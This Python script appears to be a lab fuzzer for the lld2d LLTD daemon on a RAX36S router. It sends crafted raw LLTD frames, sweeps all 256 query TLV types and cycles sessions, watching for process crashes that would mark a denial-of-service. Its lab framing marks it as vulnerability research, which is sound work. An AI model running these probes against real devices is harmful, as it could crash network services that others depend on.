#!/usr/bin/env python3
"""Stateful LLTD session and transition probes for the isolated RAX36S lab."""

from __future__ import annotations

import os
import socket
import struct
import time


INTERFACE = "client0"
MAPPER_INTERFACE = "client0"
ETHERTYPE_LLTD = 0x88D9
LLTD_MULTICAST = bytes.fromhex("0180c200000e")
BROADCAST = b"\xff" * 6


def interface_mac(name: str) -> bytes:
    with open(f"/sys/class/net/{name}/address", encoding="ascii") as handle:
        return bytes.fromhex(handle.read().strip().replace(":", ""))


def lld2d_pids() -> list[int]:
    result = []
    for entry in os.scandir("/proc"):
        if not entry.name.isdigit():
            continue
        try:
            command = open(f"/proc/{entry.name}/cmdline", "rb").read()
        except OSError:
            continue
        if b"/usr/sbin/lld2d" in command:
            result.append(int(entry.name))
    return sorted(result)


def base(
    source: bytes,
    destination: bytes,
    function: int,
    sequence: int = 0,
    tos: int = 0,
) -> bytes:
    return struct.pack(
        "!BBBB6s6sH", 1, tos, 0, function, destination, source, sequence
    )


def frame(source: bytes, destination: bytes, payload: bytes) -> bytes:
    return destination + source + struct.pack("!H", ETHERTYPE_LLTD) + payload


def parse_lltd(packet: bytes) -> tuple[int, int, bytes, bytes, bytes] | None:
    if len(packet) < 32 or packet[12:14] != struct.pack("!H", ETHERTYPE_LLTD):
        return None
    payload = packet[14:]
    return payload[1], payload[3], payload[4:10], payload[10:16], payload[18:]


def exchange(
    channel: socket.socket,
    source: bytes,
    destination: bytes,
    payload: bytes,
    timeout: float,
) -> list[tuple[int, int, bytes, bytes, bytes]]:
    channel.send(frame(source, destination, payload))
    deadline = time.monotonic() + timeout
    received = []
    while time.monotonic() < deadline:
        channel.settimeout(max(0.01, deadline - time.monotonic()))
        try:
            packet = channel.recv(4096)
        except TimeoutError:
            break
        parsed = parse_lltd(packet)
        if parsed is not None and parsed[3] != source:
            received.append(parsed)
    return received


def healthy(original: list[int]) -> bool:
    return bool(set(original) & set(lld2d_pids()))


def establish(
    channel: socket.socket, source: bytes, responder: bytes, original: list[int]
) -> tuple[bool, int]:
    replies = exchange(
        channel,
        source,
        LLTD_MULTICAST,
        base(source, BROADCAST, 0) + struct.pack("!HH", 0, 0),
        1.2,
    )
    hellos = [item for item in replies if item[1] == 1]
    generation = struct.unpack("!H", hellos[-1][4][:2])[0] if hellos and len(hellos[-1][4]) >= 2 else 0
    selected = generation + 1 if generation < 0xFFFF else 1
    exchange(
        channel,
        source,
        LLTD_MULTICAST,
        base(source, BROADCAST, 0)
        + struct.pack("!HH", selected, 1)
        + responder,
        0.4,
    )
    print(
        f"establish hello_count={len(hellos)} advertised_generation={generation} "
        f"selected_generation={selected} alive={healthy(original)}"
    )
    return bool(hellos), selected


def main() -> int:
    source = interface_mac(MAPPER_INTERFACE)
    responder = interface_mac("br0")
    original = lld2d_pids()
    if not original:
        print("baseline_failed=no_lld2d_process")
        return 2

    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)) as channel:
        channel.bind((INTERFACE, 0))
        channel.settimeout(0.05)
        try:
            while channel.recv(4096):
                pass
        except TimeoutError:
            pass

        hello_seen, generation = establish(channel, source, responder, original)
        if not hello_seen:
            print("stateful_blocker=no_hello_response")
            return 3

        cases = [
            ("query-large-valid-seq", 11, 1, b"\x0e\x00\x00\x00"),
            ("query-large-next-seq", 11, 2, b"\x0e\x00\x00\x01"),
            ("query-large-zero-seq", 11, 0, b"\x0e\x00\x00\x00"),
            ("query-large-wrap-seq", 11, 0xFFFF, b"\x0e\xff\xff\xff"),
            ("query-large-truncated", 11, 3, b"\x0e"),
            ("query-empty", 6, 4, b""),
            ("charge-zero", 9, 0, b""),
            ("charge-ack", 9, 5, b""),
            (
                "emit-train",
                2,
                6,
                struct.pack("!HBB6s6s", 1, 0, 1, source, responder),
            ),
            (
                "emit-probe",
                2,
                7,
                struct.pack("!HBB6s6s", 1, 1, 1, source, responder),
            ),
            (
                "emit-two-descriptors",
                2,
                8,
                struct.pack("!HBB6s6sBB6s6s", 2, 0, 1, source, responder, 1, 1, responder, source),
            ),
        ]
        for name, function, sequence, body in cases:
            replies = exchange(
                channel,
                source,
                responder,
                base(source, responder, function, sequence) + body,
                0.35,
            )
            reply_functions = ",".join(str(item[1]) for item in replies) or "none"
            alive = healthy(original)
            print(
                f"{name} sequence={sequence} replies={len(replies)} "
                f"reply_functions={reply_functions} alive={alive}"
            )
            if not alive:
                print(f"crash_candidate={name}")
                return 1

        for tlv_type in range(256):
            sequence = (tlv_type % 0xFFFE) + 1
            offset = ((tlv_type * 0x010101) & 0xFFFFFF).to_bytes(3, "big")
            exchange(
                channel,
                source,
                responder,
                base(source, responder, 11, sequence)
                + bytes((tlv_type,))
                + offset,
                0.01,
            )
            if not healthy(original):
                print(f"crash_candidate=query-large-type-{tlv_type}")
                return 1
        print("mutation_group=query-large-all-types-offset-sweep cases=256 alive=true")

        transition_cases = (
            ("reset-associated", 8, 0, b""),
            ("post-reset-query", 11, 9, b"\x0e\x00\x00\x00"),
        )
        for name, function, sequence, body in transition_cases:
            replies = exchange(
                channel,
                source,
                responder if function != 8 else LLTD_MULTICAST,
                base(
                    source,
                    responder if function != 8 else BROADCAST,
                    function,
                    sequence,
                )
                + body,
                0.35,
            )
            alive = healthy(original)
            print(f"{name} replies={len(replies)} alive={alive}")
            if not alive:
                print(f"crash_candidate={name}")
                return 1

        for cycle in range(32):
            seen, _ = establish(channel, source, responder, original)
            exchange(
                channel,
                source,
                responder,
                base(source, responder, 11, (cycle % 0xFFFF) + 1)
                + b"\x0e\x00\x00\x00",
                0.03,
            )
            exchange(
                channel,
                source,
                LLTD_MULTICAST,
                base(source, BROADCAST, 8),
                0.03,
            )
            if not healthy(original):
                print(f"crash_candidate=session-cycle-{cycle}")
                return 1
            print(f"session_cycle={cycle} hello_seen={seen} alive=true")

    print(
        f"result=no-observable-stateful-lld2d-dos generation={generation} "
        "directed_cases=13 stateful_mutations=256 session_cycles=32"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
